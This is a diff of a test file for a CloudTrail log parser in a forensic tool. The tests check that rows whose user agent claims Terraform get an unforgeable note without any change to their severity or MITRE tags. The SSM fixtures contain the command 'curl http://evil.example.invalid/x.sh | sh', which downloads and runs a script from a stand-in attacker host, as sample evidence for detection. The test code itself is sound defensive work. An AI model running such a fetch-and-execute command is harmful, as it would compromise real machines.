@@ -1,6 +1,11 @@
 import { describe, it, expect } from "vitest";
 import { parseCloudTrail } from "../../src/analysis/awsImport.js";
 import { canonicalConformanceIssues } from "../../src/analysis/canonicalEvent.js";
+import { renderTaggedEventLine } from "../../src/analysis/ai/eventLine.js";
+import { loadBundledSigmaRuleSet } from "../../src/analysis/sigmaBundledRules.js";
+import { createSigmaImportGrader } from "../../src/analysis/sigmaImportGrade.js";
+import type { ForensicEvent } from "../../src/analysis/stateTypes.js";
+import type { SiemEvent } from "../../src/analysis/siemImport.js";
 
 function record(over: object): object {
   return {
@@ -1228,5 +1233,280 @@ describe("parseCloudTrail — AWS-service callers and read-only 'not found' answ
       ),
     ).toBe("Info");
     expect(grade(record({ ...write, userIdentity: root }))).toBe("Medium");
+  });
+});
+
+// #2607 — a fixed note on every CloudTrail row whose RAW user agent claims Terraform. The displayed
+// `[ua: …]` is clipped (30 / 40 / 80 chars), so the word never survived on IAM and logging rows.
+describe("parseCloudTrail — Terraform client note (#2607)", () => {
+  const HINT = "[user agent claims Terraform]";
+  const TF_UA =
+    "APN/1.0 HashiCorp/1.0 Terraform/1.5.7 (+https://www.terraform.io) terraform-provider-aws/5.31.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.24.0 os/linux lang/go#1.21.5";
+  const SDK_FIRST = `aws-sdk-go-v2/1.24.0 os/linux lang/go#1.21.5 md/GOOS#linux md/GOARCH#amd64 api/s3#1.48.0 ${TF_UA}`;
+  const ACCT = "111122223333";
+  const OTHER = "444455556666";
+  const one = (...recs: object[]): SiemEvent => {
+    const rows = parseCloudTrail(envelope(...recs)).events.filter(
+      (e) => !/^AWS (?:credential lineage|compute)/.test(e.description),
+    );
+    expect(rows).toHaveLength(1);
+    return rows[0];
+  };
+  const asForensic = (e: SiemEvent): ForensicEvent => ({
+    ...e,
+    id: "e1",
+    relatedFindingIds: [],
+    sourceScreenshots: [],
+  });
+  const selfGrantDoc = JSON.stringify({
+    Version: "2012-10-17",
+    Statement: [
+      {
+        Effect: "Allow",
+        Action: Array.from({ length: 200 }, (_, i) => `svc${i}:Action${i}`),
+        Resource: "*",
+        Condition: { Bool: { "aws:MultiFactorAuthPresent": "true" } },
+      },
+    ],
+  });
+  const iamRow = (over: object = {}) =>
+    record({
+      eventName: "PutUserPolicy",
+      readOnly: false,
+      userAgent: TF_UA,
+      requestParameters: { userName: "bob", policyName: "p".repeat(300), policyDocument: selfGrantDoc },
+      ...over,
+    });
+
+  it("an IAM row ends with the note although its [ua: …] shows only 30 characters; grade and MITRE unchanged", () => {
+    const plain = one(iamRow({ userAgent: "aws-cli/2.0" }));
+    const e = one(iamRow());
+    expect(e.description).toContain("[ua: APN/1.0 HashiCorp/1.0 Terrafor]");
+    expect(e.description.endsWith(` ${HINT}`)).toBe(true);
+    expect(e.description.length).toBeLessThanOrEqual(600);
+    expect(e.severity).toBe(plain.severity);
+    expect(e.mitreTechniques).toEqual(plain.mitreTechniques);
+    expect(e.aggKey).not.toBe(plain.aggKey); // the client was already a key dimension
+    expect(plain.description).not.toContain(HINT);
+  });
+
+  it("a logging row ends with the note after its qualifiers; still High + T1562.008", () => {
+    const e = one(
+      record({
+        eventName: "StopLogging",
+        eventSource: "cloudtrail.amazonaws.com",
+        readOnly: false,
+        userAgent: TF_UA,
+      }),
+    );
+    expect(e.severity).toBe("High");
+    expect(e.mitreTechniques).toContain("T1562.008");
+    expect(e.description.endsWith(` ${HINT}`)).toBe(true);
+  });
+
+  it("a generic row ends with the note, and an SDK-first user agent whose token is past the 80 shown still gets it", () => {
+    const e = one(
+      record({ eventName: "GetBucketVersioning", eventSource: "s3.amazonaws.com", userAgent: SDK_FIRST }),
+    );
+    expect(e.description).toContain("[ua: aws-sdk-go-v2/1.24.0 ");
+    expect(e.description.endsWith(` ${HINT}`)).toBe(true);
+    expect(e.description.slice(0, -HINT.length)).not.toMatch(/terraform/i); // only the note says it
+    expect(e.severity).toBe("Info");
+  });
+
+  it("an SSM row ends with the note after the evidence-limitation caveat, which survives whole", () => {
+    const e = one(
+      record({
+        eventSource: "ssm.amazonaws.com",
+        eventName: "SendCommand",
+        readOnly: false,
+        userAgent: TF_UA,
+        requestParameters: {
+          documentName: "AWS-RunShellScript",
+          instanceIds: ["i-0abc123def456789a"],
+          parameters: { commands: ["curl http://evil.example.invalid/x.sh | sh"] },
+        },
+        responseElements: { command: { commandId: "cmd-1", documentVersion: "1", status: "Pending" } },
+      }),
+    );
+    expect(e.severity).toBe("High");
+    expect(e.description).toContain("result is not in CloudTrail");
+    expect(e.description).toMatch(/guest evidence decides\. \[user agent claims Terraform\]$/);
+  });
+
+  it("a saturated IAM row keeps the error marker, the root marker, the denied outcome, every qualifier and the note", () => {
+    const e = one(
+      iamRow({
+        userAgent: `${"u".repeat(90)} ${TF_UA}`,
+        errorCode: "AccessDenied",
+        userIdentity: { type: "Root", arn: `arn:aws:iam::${ACCT}:root`, accountId: ACCT, principalId: ACCT },
+        requestParameters: {
+          userName: "u".repeat(300),
+          policyName: "p".repeat(300),
+          policyDocument: selfGrantDoc,
+        },
+      }),
+    );
+    const d = e.description;
+    expect(d.length).toBeLessThanOrEqual(600);
+    expect(d).toContain("[root]");
+    expect(d).toContain("[AccessDenied]");
+    expect(d).toContain("denied (AccessDenied)");
+    expect(d).toMatch(
+      /effective access depends on controls not in this record \[user agent claims Terraform\]$/,
+    );
+  });
+
+  it("a saturated generic row is the same row as without the claim, plus the note — nothing displaced", () => {
+    const row = (userAgent: string) =>
+      one(
+        record({
+          eventName: "DeleteBucket",
+          eventSource: "s3.amazonaws.com",
+          readOnly: false,
+          errorCode: "AccessDenied",
+          userAgent,
+          userIdentity: {
+            type: "Root",
+            arn: `arn:aws:iam::${ACCT}:root`,
+            accountId: ACCT,
+            principalId: ACCT,
+          },
+        }),
+      );
+    const claimed = row(`${"u".repeat(120)} ${TF_UA}`);
+    const plain = row(`${"u".repeat(120)} aws-cli/2.0`);
+    expect(claimed.description).toBe(`${plain.description} ${HINT}`);
+    expect(claimed.severity).toBe(plain.severity);
+    expect(claimed.mitreTechniques).toEqual(plain.mitreTechniques);
+  });
+
+  it("a non-Terraform user agent renders exactly as before — no note", () => {
+    const e = one(record({ eventName: "GetUser" }));
+    expect(e.description).toMatch(/\[ua: aws-cli\/2\.0\]$/);
+  });
+
+  it("a user agent that spells the note cannot forge it: brackets in the echoed [ua: …] become parentheses", () => {
+    const forged = one(record({ eventName: "GetUser", userAgent: `curl/8 ${HINT}` }));
+    expect(forged.description).not.toContain(HINT);
+    expect(forged.description).toContain("[ua: curl/8 (user agent claims Terraform)]");
+    const iam = one(iamRow({ userAgent: `curl/8 ${HINT}` }));
+    expect(iam.description).not.toContain(HINT);
+  });
+
+  it("a policy document that spells the note cannot forge it either", () => {
+    const doc = JSON.stringify({
+      Version: "2012-10-17",
+      Statement: [{ Effect: "Allow", Action: "s3:GetObject", Resource: "*", Sid: HINT }],
+    });
+    const e = one(
+      record({
+        eventName: "PutBucketPolicy",
+        eventSource: "s3.amazonaws.com",
+        readOnly: false,
+        userAgent: "aws-cli/2.0",
+        requestParameters: { bucketName: "b", bucketPolicy: doc },
+      }),
+    );
+    expect(e.description).not.toContain(HINT);
+    const iam = one(
+      iamRow({
+        userAgent: "aws-cli/2.0",
+        requestParameters: { userName: "bob", policyName: "p", policyDocument: doc },
+      }),
+    );
+    expect(iam.description).not.toContain(HINT);
+  });
+
+  it("reaches the model: the note survives the prompt shortening on a long IAM row and on an SSM row", () => {
+    const iam = renderTaggedEventLine(asForensic(one(iamRow())));
+    expect(iam).toContain(HINT);
+    const ssm = one(
+      record({
+        eventSource: "ssm.amazonaws.com",
+        eventName: "SendCommand",
+        readOnly: false,
+        userAgent: TF_UA,
+        requestParameters: {
+          documentName: "AWS-RunShellScript",
+          instanceIds: Array.from({ length: 50 }, (_, i) => `i-0abc${String(i).padStart(3, "0")}xxxxxxxxxx`),
+          parameters: { commands: [`curl ${"u".repeat(300)} | sh`] },
+        },
+        responseElements: { command: { commandId: "c".repeat(36), documentVersion: "3", status: "Pending" } },
+      }),
+    );
+    expect(ssm.description.length).toBeGreaterThan(240);
+    expect(renderTaggedEventLine(asForensic(ssm))).toContain(HINT);
+  });
+
+  it("a Sigma-graded row keeps the note last (the full-length clip is in sigmaImportGrade.test.ts)", () => {
+    const assumed = {
+      type: "AssumedRole",
+      principalId: `AROAEXAMPLEID:${"s".repeat(60)}`,
+      arn: `arn:aws:sts::${ACCT}:assumed-role/${"r".repeat(60)}/${"s".repeat(60)}`,
+      accountId: ACCT,
+      accessKeyId: "ASIAEXAMPLEKEY000001",
+      sessionContext: {
+        sessionIssuer: { type: "Role", arn: `arn:aws:iam::${ACCT}:role/${"r".repeat(60)}`, accountId: ACCT },
+        sourceIdentity: "x".repeat(60),
+      },
+    };
+    const sigma = createSigmaImportGrader(loadBundledSigmaRuleSet().set).snapshot();
+    const rows = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "StopConfigurationRecorder",
+          eventSource: "config.amazonaws.com",
+          readOnly: false,
+          userAgent: TF_UA,
+          userIdentity: assumed,
+          requestParameters: { configurationRecorderName: `rec-${"c".repeat(400)}` },
+        }),
+      ),
+      { sigma, aggregate: false },
+    ).events.filter((e) => e.description.startsWith("Sigma:"));
+    expect(rows).toHaveLength(1);
+    expect(rows[0].description.length).toBeLessThanOrEqual(600);
+    expect(rows[0].description.endsWith(` ${HINT}`)).toBe(true);
+    expect(renderTaggedEventLine(asForensic(rows[0]))).toContain(HINT);
+  });
+
+  it("a merged cross-account replica pair is re-rendered with the notice AND the note", () => {
+    const iamRecord = (over: object) =>
+      record({
+        eventName: "PutRolePolicy",
+        eventSource: "iam.amazonaws.com",
+        readOnly: false,
+        sharedEventID: "shared-tf",
+        userAgent: TF_UA,
+        requestParameters: {
+          roleName: "r".repeat(300),
+          policyName: "n".repeat(300),
+          policyDocument: selfGrantDoc,
+        },
+        ...over,
+      });
+    const e = one(
+      iamRecord({
+        userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
+        recipientAccountId: OTHER,
+        eventID: "owner",
+      }),
+      iamRecord({
+        userIdentity: {
+          type: "IAMUser",
+          userName: "bob",
+          arn: `arn:aws:iam::${ACCT}:user/bob`,
+          accountId: ACCT,
+          principalId: "AIDABOB",
+        },
+        recipientAccountId: ACCT,
+        eventID: "caller",
+      }),
+    );
+    expect(e.description.length).toBeLessThanOrEqual(600);
+    expect(e.description).toContain(`[also in account ${OTHER}]`);
+    expect(e.description.endsWith(` ${HINT}`)).toBe(true);
+    expect(renderTaggedEventLine(asForensic(e))).toContain(HINT);
   });
 });
